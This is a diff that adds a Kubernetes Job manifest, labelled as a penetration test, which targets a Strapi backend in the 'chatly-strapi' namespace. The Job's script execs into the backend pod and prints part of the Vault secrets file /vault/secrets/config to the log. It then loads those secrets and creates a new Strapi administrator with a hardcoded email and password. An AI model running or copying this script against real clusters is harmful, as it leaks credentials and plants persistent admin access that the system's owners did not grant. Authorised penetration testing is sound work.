@@ -1,0 +1,34 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: adminmk1
+  namespace: pentest-1148
+  labels:
+    purpose: pentest-1148
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1148
+    spec:
+      serviceAccountName: probe
+      restartPolicy: Never
+      containers:
+      - name: c
+        image: bitnami/kubectl:1.31
+        command: ["/bin/bash","-c"]
+        args:
+        - |
+          set -x
+          export HOME=/tmp
+          POD=$(kubectl -n chatly-strapi get pods -l app=chatly-strapi-backend -o jsonpath='{.items[0].metadata.name}')
+          echo "POD=$POD"
+          if [ -z "$POD" ]; then kubectl -n chatly-strapi get pods -o wide; echo "##NOPOD"; exit 0; fi
+          echo "##LS"
+          kubectl -n chatly-strapi exec "$POD" -- sh -c 'pwd; ls -la /opt/app | head -20; echo ---BIN---; ls /opt/app/node_modules/@strapi/strapi/bin/ 2>&1; echo ---CONFHEAD---; head -c 160 /vault/secrets/config' 2>&1
+          echo "##CREATE"
+          timeout 200 kubectl -n chatly-strapi exec "$POD" -- sh -c 'cd /opt/app && set -a && . /vault/secrets/config && set +a && node node_modules/@strapi/strapi/bin/strapi.js admin:create-user --firstname=Pen --lastname=Test --email=pentest-i1363@example.com --password=Px9qLm2Vt7' 2>&1
+          echo "##RC=$?"
+          echo "##DONE"
